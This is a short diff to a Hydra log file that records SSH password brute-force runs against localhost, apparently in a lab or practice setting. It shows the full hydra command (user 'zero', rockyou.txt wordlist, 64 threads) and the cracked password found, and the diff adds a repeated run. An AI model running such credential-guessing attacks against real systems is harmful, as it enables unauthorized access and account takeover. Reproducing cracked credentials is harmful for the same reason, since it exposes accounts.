@@ -2,3 +2,5 @@
 # Hydra v9.5 run at 2023-10-02 18:14:46 on 127.0.0.1 ssh (hydra -l zero -P rockyou.txt -t 64 -vV -o output.log -I ssh://127.0.0.1)
 [22][ssh] host: 127.0.0.1   login: zero   password: Cmonster2006
 [22][ssh] host: 127.0.0.1   login: zero   password: Cmonster2006
+# Hydra v9.5 run at 2023-10-02 18:45:21 on 127.0.0.1 ssh (hydra -l zero -P rockyou.txt -t 64 -vV -o output.log -I ssh://127.0.0.1)
+[22][ssh] host: 127.0.0.1   login: zero   password: Cmonster2006
